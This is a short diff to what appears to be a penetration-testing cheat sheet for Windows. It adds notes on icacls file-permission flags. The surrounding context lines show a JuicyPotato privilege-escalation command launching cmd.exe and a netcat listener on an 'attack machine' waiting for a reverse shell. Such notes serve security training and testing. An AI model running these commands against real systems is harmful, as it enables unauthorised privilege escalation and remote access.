@@ -28,6 +28,27 @@ PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\pu
 <b># attack machine</b>
 $ nc -nvlp 5555
 </pre>
+## File permissions
+<pre>
+C:\ icacls "C:\file1.txt"
+</pre>
+<pre>
+<b># resource access level</b>
+(CI): container inherit
+(OI): object inherit
+(IO): inherit only
+(NP): do not propagate inherit
+(I): permission inherited from parent container
+
+<b># basic access permissions</b>
+F : full access
+D :  delete access
+N :  no access
+M :  modify access
+RX :  read and execute access
+R :  read-only access
+W :  write-only access
+</pre>
 ## Host enumeration
 ### Host enumeration with WMIC
 |Command|Description|
